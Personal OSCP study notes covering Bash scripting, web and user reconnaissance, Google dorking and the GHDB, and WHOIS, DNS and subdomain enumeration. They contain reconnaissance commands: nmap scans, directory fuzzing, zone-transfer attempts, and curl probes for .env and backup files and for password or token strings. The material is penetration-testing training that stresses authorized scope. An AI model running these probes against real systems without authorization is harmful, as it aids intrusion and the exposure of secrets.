The packet capture still shows metadata such as:

```
Source IP
Destination IP
Port
Timing
Packet sizes
```

but the application data is generally not directly readable.

---------------------------
# ==Bash Scripting==
![[monochrome_dark 1.png]]
## 1. What is Bash Scripting?

**Bash scripting** is the process of writing commands into a script so they can be executed automatically.

For OSCP, Bash scripting is useful for:

- Automating enumeration
- Running multiple commands
- Processing scan results
- Searching files
- Looping through IPs/domains
- Automating repetitive tasks
- Building simple reconnaissance scripts

Think:

```
Manual commands
     ↓
Bash Script
     ↓
Automation
```

---

## 2. Creating a Bash Script

Create a file:

```
nano script.sh
```

Basic script:

```
#!/bin/bash

echo "Hello OSCP"
```

The first line:

```
#!/bin/bash
```

is called the **shebang**.

It tells Linux to use Bash to execute the script.

---

## 3. Executing a Script

Give it execute permission:

```
chmod +x script.sh
```

Run it:

```
./script.sh
```

Alternatively:

```
bash script.sh
```

Important difference:

```
./script.sh
    ↓
Needs executable permission

bash script.sh
    ↓
Bash directly interprets the file
```

---

## 4. Variables

Create a variable:

```
name="Kali"
```

Use it:

```
echo $name
```

Example:

```
#!/bin/bash

target="10.10.10.5"

echo "Target: $target"
```

### Important

Don't put spaces around `=`:

```
target="10.10.10.5"
```

 Incorrect:

```
target = "10.10.10.5"
```

---

## 5. User Input

Use `read`:

```
read -p "Enter target: " target

echo "Target is $target"
```

Example:

```
Enter target: 10.10.10.5
Target is 10.10.10.5
```

---

## 6. Command-Line Arguments

This is extremely useful for OSCP scripts.

Script:

```
#!/bin/bash

echo "Target: $1"
```

Run:

```
./script.sh 10.10.10.5
```

Output:

```
Target: 10.10.10.5
```

Important variables:

|Variable|Meaning|
|---|---|
|`$0`|Script name|
|`$1`|First argument|
|`$2`|Second argument|
|`$3`|Third argument|
|`$#`|Number of arguments|
|`$@`|All arguments|
|`$?`|Exit status of last command|

---

## 7. If Statements

Basic syntax:

```
if [ condition ]; then
    command
fi
```

Example:

```
if [ "$1" == "admin" ]; then
    echo "Administrator"
fi
```

With `else`:

```
if [ "$1" == "admin" ]; then
    echo "Administrator"
else
    echo "Not administrator"
fi
```

---

## 8. Useful Comparison Operators

### Strings

```
==    Equal
!=    Not equal
-z    Empty
-n    Not empty
```

Example:

```
if [ -z "$1" ]; then
    echo "Missing target"
fi
```

### Numbers

```
-eq    Equal
-ne    Not equal
-gt    Greater than
-lt    Less than
-ge    Greater/equal
-le    Less/equal
```

Example:

```
if [ "$1" -gt 10 ]; then
    echo "Greater than 10"
fi
```

---

## 9. File Tests

Very useful for automation.

```
-f file
```

Checks whether it's a regular file.

```
-d directory
```

Checks whether it's a directory.

```
-e path
```

Checks whether the path exists.

```
-r file
```

Readable.

```
-w file
```

Writable.

```
-x file
```

Executable.

Example:

```
if [ -f "targets.txt" ]; then
    echo "File exists"
fi
```

---

## 10. For Loops

One of the most useful Bash concepts for OSCP.

```
for target in 10.10.10.5 10.10.10.6 10.10.10.7
do
    echo "$target"
done
```

Output:

```
10.10.10.5
10.10.10.6
10.10.10.7
```

---

## 11. Loop Through a File

Very useful for recon.

Suppose:

```
targets.txt
```

contains:

```
10.10.10.5
10.10.10.6
10.10.10.7
```

You can do:

```
while read -r target
do
    echo "$target"
done < targets.txt
```

Mental model:

```
targets.txt
     ↓
   read
     ↓
 target variable
     ↓
 execute commands
```

---

## 12. Running Commands in a Loop

Example:

```
while read -r target
do
    ping -c 1 "$target"
done < targets.txt
```

This lets you automate repetitive tasks.

For example, conceptually:

```
Target 1 → command
Target 2 → command
Target 3 → command
...
```

---

## 13. While Loops

Syntax:

```
while [ condition ]
do
    command
done
```

Example:

```
counter=1

while [ "$counter" -le 5 ]
do
    echo "$counter"
    ((counter++))
done
```

Output:

```
1
2
3
4
5
```

---

## 14. Functions

Functions let you reuse code.

```
scan_target() {
    echo "Scanning $1"
}
```

Call it:

```
scan_target 10.10.10.5
```

Output:

```
Scanning 10.10.10.5
```

This becomes very useful when building larger scripts.

---

## 15. Exit Status

Every command returns an exit status.

```
$?
```

Example:

```
ping -c 1 10.10.10.5

echo $?
```

Typically:

```
0 → Success
non-zero → Error/failure
```

You can use this in conditions:

```
if ping -c 1 10.10.10.5 > /dev/null; then
    echo "Host is reachable"
else
    echo "Host is down"
fi
```

---

## 16. Pipes

Bash becomes extremely powerful when commands are chained together.

```
command1 | command2
```

Example:

```
cat targets.txt | grep "10.10"
```

Concept:

```
Command 1
   ↓
Output
   ↓
Command 2
```

Common tools to know:

```
grep
cut
sort
uniq
head
tail
awk
sed
tr
```

---

## 17. Redirection

### Output to file

```
command > output.txt
```

Overwrites the file.

### Append

```
command >> output.txt
```

Adds to the end.

### Input from file

```
command < input.txt
```

### Errors

```
command 2> errors.txt
```

### Output + errors

```
command > output.txt 2>&1
```

---

## 18. `grep`

One of the most important commands for OSCP.

Search:

```
grep "admin" users.txt
```

Case-insensitive:

```
grep -i "admin" users.txt
```

Recursive:

```
grep -R "password" /path/
```

Invert match:

```
grep -v "error" output.txt
```

---

## 19. Combining Tools

This is where Bash scripting becomes powerful.

Example:

```
cat targets.txt | grep "10.10" | sort -u
```

Flow:

```
targets.txt
     ↓
   grep
     ↓
   sort
     ↓
 unique results
```

You can also use:

```
grep "http" scan.txt | cut -d " " -f 1
```

The important OSCP skill is understanding **how to move data between tools**.

---

## 20. Variables + Loops + Commands

A very OSCP-style structure:

```
#!/bin/bash

for target in "$@"
do
    echo "[+] Testing $target"
    ping -c 1 "$target" > /dev/null

    if [ $? -eq 0 ]; then
        echo "[+] $target is reachable"
    else
        echo "[-] $target is unreachable"
    fi
done
```

Run:

```
./script.sh 10.10.10.5 10.10.10.6
```

This combines:

```
Arguments
   ↓
Variables
   ↓
Loop
   ↓
Command
   ↓
Exit status
   ↓
Condition
```

---

## 21. Bash Scripting for OSCP

A common workflow is:

```
Input
  ↓
Validate input
  ↓
Loop through targets
  ↓
Run enumeration
  ↓
Filter results
  ↓
Save output
```

For example:

```
targets.txt
     ↓
    Bash
     ↓
Enumeration
     ↓
grep / awk / sed
     ↓
results.txt
```

The goal isn't to write huge programs.

The goal is to **automate repetitive work**.

---

## 22. Useful Bash Concepts to Memorize

### Script

```
#!/bin/bash
```

### Variables

```
target="10.10.10.5"
echo "$target"
```

### Arguments

```
$1
$2
$#
$@
```

### Conditions

```
if [ condition ]; then
    ...
fi
```

### Loops

```
for x in ...
do
    ...
done
```

```
while read -r x
do
    ...
done < file.txt
```

### Functions

```
function_name() {
    ...
}
```

### Exit status

```
$?
```

### Pipes

```
|
```

### Redirect

```
>
>>
2>
2>&1
```

---

##  OSCP Bash Cheat Sheet

```
#!/bin/bash
```

```
target="$1"
```

```
echo "$target"
```

```
if [ -z "$target" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi
```

```
for target in "$@"; do
    echo "$target"
done
```

```
while read -r target; do
    echo "$target"
done < targets.txt
```

```
command > output.txt
```

```
command >> output.txt
```

```
command 2> errors.txt
```

```
command > output.txt 2>&1
```

```
command1 | command2
```

```
grep "pattern" file.txt
```

```
sort -u file.txt
```

```
echo $?
```

---

## IF, Loops & Functions — OSCP

## 1. IF Statements

Used to make decisions based on conditions.

### Basic Syntax

```bash
if [ condition ]; then
    command
fi
```

### Example

```bash
#!/bin/bash

target="10.10.10.5"

if [ "$target" == "10.10.10.5" ]; then
    echo "Target found"
fi
```

### IF / ELSE

```bash
if [ condition ]; then
    command
else
    command
fi
```

Example:

```bash
if [ -f "passwd.txt" ]; then
    echo "File exists"
else
    echo "File not found"
fi
```

### IF / ELIF / ELSE

```bash
if [ condition ]; then
    command
elif [ condition ]; then
    command
else
    command
fi
```

Example:

```bash
if [ "$port" -eq 80 ]; then
    echo "HTTP"
elif [ "$port" -eq 443 ]; then
    echo "HTTPS"
else
    echo "Other port"
fi
```

---

## 2. Comparison Operators

### Numeric

|Operator|Meaning|
|---|---|
|`-eq`|Equal|
|`-ne`|Not equal|
|`-gt`|Greater than|
|`-lt`|Less than|
|`-ge`|Greater/equal|
|`-le`|Less/equal|

Example:

```bash
if [ "$port" -eq 80 ]; then
    echo "HTTP"
fi
```

### String

```bash
[ "$user" == "admin" ]
[ "$user" != "guest" ]
[ -z "$user" ]
[ -n "$user" ]
```

- `-z` → string is empty
    
- `-n` → string is not empty
    

---

## 3. File Tests

Very useful during OSCP enumeration.

```bash
[ -f file ]
[ -d directory ]
[ -e path ]
[ -r file ]
[ -w file ]
[ -x file ]
```

|Test|Meaning|
|---|---|
|`-f`|Regular file|
|`-d`|Directory|
|`-e`|Exists|
|`-r`|Readable|
|`-w`|Writable|
|`-x`|Executable|

Example:

```bash
if [ -f "/etc/passwd" ]; then
    echo "passwd exists"
fi
```

---

## 4. FOR Loops

Used when you want to repeat something over a list.

### Basic

```bash
for item in list; do
    command
done
```

Example:

```bash
for ip in 10.10.10.1 10.10.10.2 10.10.10.3; do
    echo "$ip"
done
```

### Loop Through a File

```bash
for target in $(cat targets.txt); do
    echo "$target"
done
```

Better for line-based input:

```bash
while read -r target; do
    echo "$target"
done < targets.txt
```

### Numeric Loop

```bash
for i in {1..10}; do
    echo "$i"
done
```

Useful OSCP example:

```bash
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "Host up: 192.168.1.$i"
    fi
done
```

---

## 5. WHILE Loops

Runs while a condition is true.

```bash
while [ condition ]; do
    command
done
```

Example:

```bash
counter=1

while [ "$counter" -le 5 ]; do
    echo "$counter"
    ((counter++))
done
```

### Read a File

```bash
while read -r target; do
    echo "Scanning $target"
done < targets.txt
```

This is usually preferable to `for target in $(cat targets.txt)` because it handles lines containing spaces more safely.

---

## 6. UNTIL Loops

Runs until a condition becomes true.

```bash
until [ condition ]; do
    command
done
```

Example:

```bash
counter=1

until [ "$counter" -gt 5 ]; do
    echo "$counter"
    ((counter++))
done
```

---

## 7. BREAK & CONTINUE

### break

Stops the loop completely.

```bash
for i in {1..10}; do
    if [ "$i" -eq 5 ]; then
        break
    fi

    echo "$i"
done
```

Output:

```text
1
2
3
4
```

### continue

Skips the current iteration.

```bash
for i in {1..5}; do
    if [ "$i" -eq 3 ]; then
        continue
    fi

    echo "$i"
done
```

Output:

```text
1
2
4
5
```

---

## 8. Functions

Functions let you reuse commands without repeating code.

### Basic Syntax

```bash
function_name() {
    commands
}
```

Example:

```bash
scan_host() {
    echo "Scanning $1"
    ping -c 1 "$1"
}
```

Call it:

```bash
scan_host 10.10.10.5
```

---

## 9. Function Arguments

Functions have their own positional arguments:

```bash
$1
$2
$3
```

Example:

```bash
scan_port() {
    echo "Target: $1"
    echo "Port: $2"
}

scan_port 10.10.10.5 80
```

Output:

```text
Target: 10.10.10.5
Port: 80
```

---

## 10. Return Values

Functions can return an exit status.

```bash
check_file() {
    if [ -f "$1" ]; then
        return 0
    else
        return 1
    fi
}
```

Use it:

```bash
check_file "/etc/passwd"

if [ $? -eq 0 ]; then
    echo "File exists"
else
    echo "File doesn't exist"
fi
```

Remember:

```text
0     = Success
Non-0 = Failure
```

---

## 11. Combining IF + Loops + Functions

This is where Bash becomes very useful for OSCP automation.

```bash
#!/bin/bash

check_host() {
    local ip="$1"

    ping -c 1 -W 1 "$ip" >/dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "[+] Host up: $ip"
    else
        echo "[-] Host down: $ip"
    fi
}

for i in {1..10}; do
    check_host "192.168.1.$i"
done
```

Mental flow:

```text
FOR
 ↓
Call Function
 ↓
IF
 ↓
Run Command
 ↓
Check Exit Status
 ↓
Continue Loop
```

---

## 12. OSCP Example — Process a Target List

```bash
#!/bin/bash

check_target() {
    local target="$1"

    echo "[*] Checking $target"

    if ping -c 1 -W 1 "$target" >/dev/null 2>&1; then
        echo "[+] $target is UP"
    else
        echo "[-] $target is DOWN"
    fi
}

while read -r target; do
    check_target "$target"
done < targets.txt
```

`targets.txt`:

```text
10.10.10.5
10.10.10.6
10.10.10.7
```

This pattern is extremely useful for automating repetitive enumeration.

---

## OSCP Cheat Sheet

### IF

```bash
if [ "$x" -eq 1 ]; then
    echo "yes"
elif [ "$x" -eq 2 ]; then
    echo "maybe"
else
    echo "no"
fi
```

### FOR

```bash
for x in list; do
    echo "$x"
done
```

### WHILE

```bash
while read -r x; do
    echo "$x"
done < file.txt
```

### FUNCTION

```bash
function_name() {
    echo "$1"
}

function_name "hello"
```

### File Check

```bash
[ -f file ]
[ -d directory ]
[ -e path ]
[ -r file ]
[ -w file ]
[ -x file ]
```

### Numeric

```bash
-eq
-ne
-gt
-lt
-ge
-le
```

### Loop Control

```bash
break
continue
```

### Exit Status

```bash
$?
```

---

## What to Memorize for OSCP

```text
if / elif / else
↓
[ condition ]
↓
-eq -ne -gt -lt -ge -le
↓
-f -d -e -r -w -x
↓
for
↓
while read -r
↓
break / continue
↓
functions
↓
$1 $2 $@
↓
$?
```

**OSCP mental model:**  
**IF = decision** → **LOOP = repetition** → **FUNCTION = reusable logic** → **$? = result of the previous command**.

---------
# ==Recon==
![[9e65e8b3-ec50-4c29-9823-f0be48c20cb2.jpeg|700]]
### Summery :
![[Pasted image 20260904053611.png]]

![[Pasted image 20260904053650.png]]

![[Pasted image 20260904053745.png]]

----------
----
## Website & User Recon — OSCP

## 1. What Is Recon?

**Reconnaissance** is the process of collecting information about a target before exploitation.

For OSCP, the main goal is to answer:

> **What is this machine running, what does the website reveal, and what users/technologies can I identify?**

Think:

```text
Target
  ↓
IP / Hostname
  ↓
Open Ports
  ↓
Web Services
  ↓
Website Enumeration
  ↓
Users / Technologies / Files
  ↓
Potential Attack Surface
```

---

## 2. Identify the Target

Start with the IP address and basic connectivity.

```bash
ping -c 4 10.10.10.5
```

Check reverse DNS:

```bash
nslookup 10.10.10.5
```

or:

```bash
dig -x 10.10.10.5
```

Check hostname:

```bash
hostname
```

If you discover a hostname such as:

```text
target.local
```

Add it to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
10.10.10.5 target.local
```

Then:

```bash
ping target.local
```

---

## 3. Port Scanning

Before enumerating the website, identify the available services.

### Quick Scan

```bash
nmap -sC -sV 10.10.10.5
```

Important options:

```text
-sC     Default NSE scripts
-sV     Service/version detection
-p-     Scan all 65535 ports
```

Full scan:

```bash
nmap -p- --min-rate 2000 10.10.10.5
```

Then enumerate discovered ports:

```bash
nmap -sC -sV -p 22,80,443,8080 10.10.10.5
```

---

## 4. Identify Web Services

Common web ports:

|Port|Typical Service|
|--:|---|
|80|HTTP|
|443|HTTPS|
|8000|HTTP|
|8080|HTTP Proxy / Web App|
|8443|HTTPS|
|8888|HTTP|

Test manually:

```bash
curl http://10.10.10.5
```

Headers:

```bash
curl -I http://10.10.10.5
```

More verbose:

```bash
curl -v http://10.10.10.5
```

---

## 5. Website Enumeration

Once you find a web server, don't immediately start exploiting.

First understand the application.

Check:

```text
Homepage
├── Login
├── Register
├── Admin
├── API
├── Search
├── Upload
├── Contact
├── Documentation
├── User profiles
└── Hidden/interesting functionality
```

Look at:

- Page source
    
- HTTP headers
    
- Links
    
- Forms
    
- JavaScript
    
- Comments
    
- Cookies
    
- Error messages
    
- URLs and parameters
    

---

## 6. robots.txt

Always check:

```bash
curl http://10.10.10.5/robots.txt
```

Example:

```text
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /private/
```

`robots.txt` is **not access control**.

It can sometimes reveal interesting paths.

---

## 7. sitemap.xml

Check:

```bash
curl http://10.10.10.5/sitemap.xml
```

It may reveal:

```text
/
/login
/products
/admin
/api
/users
```

---

## 8. Directory Enumeration

Use tools such as:

```bash
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Or:

```bash
gobuster dir -u http://10.10.10.5 \
-w /usr/share/wordlists/dirb/common.txt
```

Look for:

```text
/admin
/login
/uploads
/backup
/config
/api
/dev
/test
/docs
```

Check common extensions:

```bash
ffuf -u http://10.10.10.5/FUZZ \
-w wordlist.txt \
-e .php,.html,.txt,.bak,.zip,.old
```

---

## 9. Check Source Code

Download the page:

```bash
curl -s http://10.10.10.5
```

Search for interesting information:

```bash
curl -s http://10.10.10.5 | grep -iE "user|admin|password|api|token|key"
```

Or save it:

```bash
curl -s http://10.10.10.5 -o index.html
```

Then:

```bash
less index.html
```

Look for:

```html
<!-- TODO: remove admin panel -->
```

or:

```javascript
/api/users
```

or:

```javascript
const apiKey = "..."
```

**Important:** Treat discovered credentials/secrets as sensitive and only use them within the authorized lab scope.

---

## 10. Identify Technologies

Determine what the website is running.

Useful tools:

```bash
whatweb http://10.10.10.5
```

Example:

```text
Apache
PHP
WordPress
jQuery
Bootstrap
```

Also inspect headers:

```bash
curl -I http://10.10.10.5
```

You might see:

```text
Server: Apache/2.4.x
X-Powered-By: PHP/8.x
```

Technology identification helps determine what to investigate next.

---

## 11. HTTP Headers

Useful headers include:

```text
Server
X-Powered-By
Set-Cookie
Location
Content-Type
X-Frame-Options
Content-Security-Policy
```

Command:

```bash
curl -I http://10.10.10.5
```

Cookies:

```bash
curl -c cookies.txt http://10.10.10.5
```

---

## 12. Find Virtual Hosts

A single IP can host multiple websites.

Example:

```text
10.10.10.5
├── website.local
├── admin.local
└── dev.local
```

If the application gives you a hostname, add it to `/etc/hosts`.

For authorized lab enumeration, you can test candidate hostnames:

```bash
ffuf -u http://10.10.10.5/ \
-H "Host: FUZZ.target.local" \
-w subdomains.txt \
-fs 1234
```

The important concept is:

> **Different Host headers can lead to different virtual hosts on the same IP.**

---

## 13. User Recon

User enumeration is important because usernames can become valuable later for:

- Authentication testing
    
- Password spraying in authorized labs
    
- SSH access
    
- Application login
    
- Privilege escalation
    
- Credential correlation
    

Potential sources:

```text
Website
├── Authors
├── User profiles
├── Comments
├── Contact pages
├── Git repositories
├── Documentation
├── API responses
└── Error messages
```

---

## 14. Look for Usernames

Example website:

```text
/blog/john-smith
/blog/admin
/users/bob
```

You may discover:

```text
john
admin
bob
developer
```

Record them:

```bash
nano users.txt
```

```text
admin
john
bob
developer
```

Don't assume every discovered name is a valid account—**verify it through the application's behavior or another authorized source.**

---

## 15. Login Pages

Common locations:

```text
/login
/admin
/admin/login
/signin
/wp-login.php
/user/login
```

Identify:

```text
Username field
Password field
Remember me
Registration
Password reset
MFA
Error messages
```

Pay attention to differences such as:

```text
"Invalid username"
```

vs.

```text
"Invalid password"
```

Different responses can sometimes indicate **user enumeration**.

---

## 16. Password Reset Functionality

Check:

```text
Forgot Password
Reset Password
Account Recovery
```

Understand the flow:

```text
Username/email
      ↓
Reset request
      ↓
Token
      ↓
Reset page
      ↓
New password
```

For OSCP, pay attention to:

- Predictable tokens
    
- Information disclosure
    
- Username enumeration
    
- Weak validation
    
- Host/header-related issues
    
- Broken authorization
    

---

## 17. API Recon

Websites increasingly expose APIs.

Look for:

```text
/api
/api/v1
/api/users
/api/admin
/api/login
/api/docs
/swagger
/openapi.json
```

Try:

```bash
curl http://10.10.10.5/api
```

Check JavaScript for endpoints:

```bash
grep -RoiE '"/api[^"]*"' .
```

You may discover functionality that isn't visible in the normal UI.

---

## 18. JavaScript Recon

JavaScript can reveal:

```text
API endpoints
Hidden routes
Parameter names
Functionality
Environment information
Development endpoints
Third-party services
```

Find JavaScript files:

```bash
curl -s http://10.10.10.5 | grep -oE 'src="[^"]+\.js[^"]*"'
```

Download interesting files and inspect them:

```bash
wget http://10.10.10.5/app.js
```

Then:

```bash
grep -iE "api|admin|user|token|debug|password" app.js
```

---

## 19. Backup & Sensitive Files

Check for common files:

```text
backup.zip
backup.tar.gz
database.sql
config.php.bak
.env
.htaccess
web.config
robots.txt
```

Examples:

```bash
curl http://10.10.10.5/.env
curl http://10.10.10.5/backup.zip
```

In a real engagement, don't download sensitive data unnecessarily. In an OSCP lab, follow the lab rules.

---

## 20. Error Messages

Trigger normal invalid requests and observe the response.

You might discover:

```text
Apache version
PHP version
Framework
File paths
Database type
Debug information
Internal hostnames
```

Example:

```text
/var/www/html/index.php
```

A disclosed filesystem path can become useful later for:

```text
LFI
Path traversal
File upload
Web shell placement
Source-code analysis
```

---

## 21. Build a Recon Notebook

Don't just run commands.

Record findings.

Example:

```text
TARGET: 10.10.10.5

Ports:
22  SSH
80  HTTP
443 HTTPS

Website:
http://target.local

Technology:
Apache
PHP
WordPress

Interesting paths:
/admin
/login
/uploads
/api
/backup

Users:
admin
john
developer

Potential attack surface:
- Login
- File upload
- API
- Admin panel
- Backup file
```

This prevents you from repeatedly checking the same things.

---

## 22. OSCP Recon Workflow

A practical workflow:

```text
1. Identify IP
       ↓
2. Full Port Scan
       ↓
3. Service Enumeration
       ↓
4. Identify Web Services
       ↓
5. Browse Website
       ↓
6. Check robots.txt / sitemap.xml
       ↓
7. Inspect Source
       ↓
8. Identify Technologies
       ↓
9. Directory Enumeration
       ↓
10. JavaScript Enumeration
       ↓
11. Virtual Host Enumeration
       ↓
12. Identify Users
       ↓
13. Enumerate Login/API
       ↓
14. Search for Sensitive Files
       ↓
15. Update Attack Surface
```

---

## OSCP Quick Cheat Sheet

### Web

```bash
curl http://TARGET
curl -I http://TARGET
curl -v http://TARGET
```

### Technology

```bash
whatweb http://TARGET
```

### Directories

```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt
```

```bash
gobuster dir -u http://TARGET -w wordlist.txt
```

### Common Files

```bash
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml
curl http://TARGET/.env
```

### Source

```bash
curl -s http://TARGET -o index.html
```

### Search

```bash
grep -iE "admin|user|api|token|password" index.html
```

### Headers

```bash
curl -I http://TARGET
```

### Technology

```bash
whatweb http://TARGET
```

---

## What to Memorize

```text
Nmap
 ↓
Identify HTTP/HTTPS
 ↓
curl / browser
 ↓
robots.txt
 ↓
sitemap.xml
 ↓
Source code
 ↓
Headers
 ↓
WhatWeb
 ↓
Directory enumeration
 ↓
Virtual hosts
 ↓
JavaScript
 ↓
Users
 ↓
Login / API
 ↓
Sensitive files
 ↓
Attack surface
```

### Core OSCP Mental Model

**Website Recon = Don't just look at the homepage.**

Ask:

> **What technology?**

> **What hidden paths?**

> **What users?**

> **What files?**

> **What APIs?**

> **What virtual hosts?**

> **What functionality can I interact with?**

> **What information can I carry forward into exploitation?**



----------
----------
# ==Google Dorking &&  GHDB Database== 


![[thumb_hu899779016892558865.webp|700]]

```text
site:
intitle:
inurl:
intext:
filetype:
ext:
-
OR
```

![[Pasted image 20260904055525.png]]


**GHDB** is hosted by **Exploit Database (Exploit-DB)** and contains a large collection of search queries known as **Google Dorks**.

Official GHDB:

[https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)

### What GHDB Provides

GHDB organizes Google Dorks into categories that help security professionals discover publicly indexed information.

Examples of information that may be discovered:

- Exposed files
    
- Login pages
    
- Administrative interfaces
    
- Directory listings
    
- Configuration files
    
- Backup files
    
- Error messages
    
- Sensitive documents
    
- Network devices
    
- Web applications
    
- Publicly exposed information
    

### How to Use GHDB

Instead of manually creating every Google Dork, you can:

1. Open the GHDB.
    
2. Browse or search for a relevant category.
    
3. Select a useful dork.
    
4. Replace the target-specific portion with the authorized target.
    
5. Analyze the search results.
    
6. Use discovered information to guide further reconnaissance.
    

### Example Workflow

```text
Target
  ↓
GHDB
  ↓
Select relevant Google Dork
  ↓
Customize for target
  ↓
Google Search
  ↓
Interesting Result
  ↓
Validate Exposure
  ↓
Further Enumeration
```

### Important

GHDB is a **database of search queries**, not an exploitation framework.

A GHDB entry may help discover an exposed resource, but the discovery itself does not necessarily mean that a vulnerability exists.

For OSCP, the important skill is understanding:

**Dork → Discovery → Validation → Enumeration → Potential Attack Path**

### OSCP Note

Don't try to memorize the entire GHDB.

Know the major Google operators and understand how GHDB can be used as a **reconnaissance reference**.

Useful operators to remember:

---------
# ==Whois & Subdomain Enumeration==
![[85adcfcd-18be-4993-90eb-f43fa45a1166_1200x800.jpg]]
## 1. Objective

The goal of initial domain enumeration is to identify as much of the target's external attack surface as possible.

```
Domain
  ↓
WHOIS
  ↓
Nameservers / Organization
  ↓
DNS Enumeration
  ↓
Subdomain Enumeration
  ↓
IP Addresses
  ↓
Hosts / Services
  ↓
Further Enumeration
```

The important concept is:

> **Every piece of information discovered should lead to another enumeration step.**

---

## 2. WHOIS Enumeration

**WHOIS** provides registration and ownership-related information about a domain.

### Basic Command

```
whois example.com
```

### Look for

```
Domain Name
Registrar
Name Servers
Creation Date
Updated Date
Expiration Date
Registrant Organization
Registrant Country
```

### Most Important Information

Usually pay particular attention to:

```
Registrar
Organization
Name Servers
```

The **nameservers** are especially useful because they lead directly into DNS enumeration.

Example:

```
Name Server: ns1.example.com
Name Server: ns2.example.com
```

---

## 3. DNS Enumeration

After identifying the domain and nameservers, enumerate DNS records.

### Basic DNS Query

```
dig example.com
```

### A Record

```
dig A example.com
```

Maps:

```
Domain → IPv4
```

### AAAA Record

```
dig AAAA example.com
```

Maps:

```
Domain → IPv6
```

### NS Record

```
dig NS example.com
```

Identifies the authoritative nameservers.

### MX Record

```
dig MX example.com
```

Identifies mail servers.

### TXT Record

```
dig TXT example.com
```

May contain information such as SPF and other domain-related configuration.

### CNAME Record

```
dig CNAME sub.example.com
```

Identifies aliases pointing to another hostname.

---

## 4. Important DNS Record Types

|Record|Purpose|
|---|---|
|**A**|Hostname → IPv4|
|**AAAA**|Hostname → IPv6|
|**CNAME**|Alias → another hostname|
|**MX**|Mail servers|
|**NS**|Nameservers|
|**TXT**|Text/configuration information|
|**PTR**|IP → hostname|
|**SOA**|DNS zone authority information|

---

## 5. Subdomain Enumeration

The goal is to discover additional hosts belonging to the target domain.

Example:

```
example.com
www.example.com
api.example.com
mail.example.com
dev.example.com
test.example.com
staging.example.com
vpn.example.com
admin.example.com
```

These hosts may expose completely different applications or services.

---

## 6. DNS Enumeration with dnsenum

```
dnsenum example.com
```

`dnsenum` can enumerate DNS information and perform subdomain discovery.

Focus on identifying:

```
A
NS
MX
CNAME
Subdomains
```

---

## 7. Subdomain Brute Force

The concept:

```
Wordlist
   ↓
www
mail
ftp
dev
test
admin
vpn
api
   ↓
DNS queries
   ↓
Valid subdomains
```

A DNS wordlist can be used with enumeration tools to discover valid hosts.

Example:

```
dnsenum -f /usr/share/wordlists/dnsmap.txt example.com
```

The exact wordlist available may vary between Kali installations.

---

## 8. Amass

Amass is commonly used for broader attack-surface discovery.

### Passive Enumeration

```
amass enum -passive -d example.com
```

Conceptually:

```
example.com
     ↓
Passive data sources
     ↓
Subdomains
     ↓
Hostnames
```

For OSCP preparation, understand **what information the tool is discovering and why**, rather than memorizing every option.

---

## 9. Certificate Transparency

Certificate Transparency logs can reveal hostnames associated with TLS certificates.

For example:

```
example.com
api.example.com
dev.example.com
staging.example.com
```

A common public source is:

```
crt.sh
```

Search for:

```
%.example.com
```

This can reveal subdomains that aren't obvious from the main website.

---

## 10. CNAME Enumeration

A CNAME can reveal third-party infrastructure.

Example:

```
dig CNAME dev.example.com
```

Possible result:

```
dev.example.com → something.cloudprovider.com
```

This can reveal:

- Cloud services
- SaaS platforms
- CDNs
- Third-party hosting
- External infrastructure

---

## 11. Resolve Subdomains to IPs

Once you discover:

```
api.example.com
dev.example.com
vpn.example.com
```

Resolve them:

```
dig A api.example.com
```

or:

```
host api.example.com
```

Conceptually:

```
Subdomain
    ↓
IP Address
    ↓
Port Enumeration
    ↓
Service Enumeration
```

For an authorized OSCP target, you can then continue with appropriate network/service enumeration.

---

## 12. Reverse DNS

Reverse DNS performs the opposite lookup.

```
dig -x <IP>
```

Concept:

```
IP → hostname
```

While an A record provides:

```
hostname → IP
```

Reverse DNS can sometimes reveal additional naming information about infrastructure.

---

## 13. DNS Zone Transfer

A DNS zone transfer uses **AXFR** to request zone information from a DNS server.

Test in an authorized environment:

```
dig axfr example.com @ns1.example.com
```

If improperly configured, a zone transfer could expose multiple DNS records at once.

Potentially:

```
www.example.com
mail.example.com
dev.example.com
admin.example.com
internal.example.com
```

A successful unauthorized zone transfer is a significant DNS misconfiguration.

---

## 14. ASN / CIDR Enumeration

The domain isn't necessarily the entire attack surface.

A useful conceptual chain is:

```
Domain
   ↓
WHOIS / DNS
   ↓
Organization
   ↓
ASN
   ↓
CIDR ranges
   ↓
IP addresses
   ↓
Hosts
```

This can help identify infrastructure associated with the organization.

For OSCP, however, always remain within the authorized scope.

---

## 15. Complete Enumeration Workflow

```
                    DOMAIN
                       │
                       ▼
                    WHOIS
                       │
             ┌─────────┴─────────┐
             ▼                   ▼
        Organization        Nameservers
                                   │
                                   ▼
                           DNS Enumeration
                                   │
             ┌─────────────┬───────┼───────┐
             ▼             ▼       ▼       ▼
             A            MX      TXT     CNAME
             │
             ▼
      Subdomain Enumeration
             │
       ┌─────┼─────────┐
       ▼     ▼         ▼
    Passive  CT      Brute Force
       │     │         │
       └─────┴────┬────┘
                  ▼
            Discovered Hosts
                  │
                  ▼
              IP Addresses
                  │
                  ▼
          Further Enumeration
```

---

## 16. OSCP+ Quick Cheat Sheet

### WHOIS

```
whois example.com
```

### DNS

```
dig example.com
dig A example.com
dig AAAA example.com
dig NS example.com
dig MX example.com
dig TXT example.com
```

### CNAME

```
dig CNAME sub.example.com
```

### Reverse DNS

```
dig -x <IP>
```

### Zone Transfer

```
dig axfr example.com @ns1.example.com
```

### dnsenum

```
dnsenum example.com
```

### Amass

```
amass enum -passive -d example.com
```

---

## 17. OSCP Mindset

Don't treat enumeration as:

```
Run tool → Get output → Move on
```

Instead:

```
Find information
      ↓
Analyze it
      ↓
Ask what it reveals
      ↓
Use it for the next enumeration step
```

### Example

```
WHOIS
 ↓
Nameserver discovered
 ↓
DNS enumeration
 ↓
api.example.com discovered
 ↓
Resolve IP
 ↓
Identify exposed service
 ↓
Enumerate service
 ↓
Potential attack path
```

**Core takeaway:**

